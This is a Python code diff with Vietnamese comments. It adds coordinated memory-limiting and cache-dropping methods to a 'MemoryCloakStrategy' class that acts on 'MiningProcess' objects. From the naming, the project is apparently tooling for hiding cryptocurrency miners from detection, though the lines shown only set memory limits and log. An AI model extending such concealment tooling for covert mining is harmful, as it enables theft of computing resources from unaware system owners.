@@ -976,6 +976,126 @@ class MemoryCloakStrategy(CloakStrategy):
             )
             return False  # ✅ FAILURE: Memory cloaking failed
 
+    def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
+        """
+        **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
+        
+        Apply memory cloaking only after proper hook coordination to prevent
+        uncoordinated operations that can lead to std::bad_alloc.
+        
+        Args:
+            process: MiningProcess object (đối tượng tiến trình khai thác)
+            coordinator: Hook coordinator instance (thể hiện điều phối hook)
+            timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
+            
+        Returns:
+            bool: True if coordinated cloaking successful, False if failed/aborted
+                  (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
+        """
+        try:
+            pid, name = process.pid, process.name
+            
+            self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
+            
+            # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
+            if not coordinator.wait_for_hooks_ready(pid, timeout):
+                # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
+                self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
+                self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
+                self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
+                
+                # **Report coordination failure** (báo cáo lỗi phối hợp)
+                error_reporter.report_error(
+                    ErrorCode.STRATEGY_APPLICATION_FAILED,
+                    f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
+                    ErrorSeverity.HIGH,
+                    module='cloak_strategies',
+                    function='MemoryCloakStrategy.apply_with_coordination',
+                    process_id=pid,
+                    strategy_name='Memory',
+                    context_data={
+                        'process_name': name,
+                        'timeout': timeout,
+                        'coordination_status': 'FAILED',
+                        'action': 'ABORTED'
+                    }
+                )
+                return False  # **ABORT cloaking** thay vì force proceed
+            
+            # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
+            self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
+            
+            # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
+            return self.apply_memory_limits(process)
+            
+        except Exception as e:
+            # **Error during coordination** (lỗi trong quá trình phối hợp)
+            error_reporter.report_error(
+                ErrorCode.STRATEGY_APPLICATION_FAILED,
+                f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
+                ErrorSeverity.HIGH,
+                module='cloak_strategies',
+                function='MemoryCloakStrategy.apply_with_coordination',
+                process_id=process.pid,
+                strategy_name='Memory',
+                context_data={
+                    'process_name': process.name,
+                    'error': str(e),
+                    'stack_trace': traceback.format_exc()
+                },
+                exception=e
+            )
+            self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
+            return False
+    
+    def apply_memory_limits(self, process: MiningProcess) -> bool:
+        """
+        **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
+        
+        Internal method to apply memory limits after coordination is confirmed.
+        This is the actual memory limiting logic extracted from apply() method.
+        
+        Args:
+            process: MiningProcess object (đối tượng tiến trình khai thác)
+            
+        Returns:
+            bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
+        """
+        try:
+            pid, name = process.pid, process.name
+            
+            # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
+            if self.memory_limit_mb <= 0:
+                self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
+                return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
+            
+            # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
+            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
+            if not ok_mem:
+                self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
+                return False
+            
+            self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
+            
+            # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
+            ok_cache = self.cache_resource_manager.drop_caches()
+            if ok_cache:
+                self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
+            else:
+                self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
+            
+            return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
+            
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
+            return False
+        except psutil.AccessDenied as e:
+            self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
+            return False
+        except Exception as e:
+            self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
+            return False
+
     def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
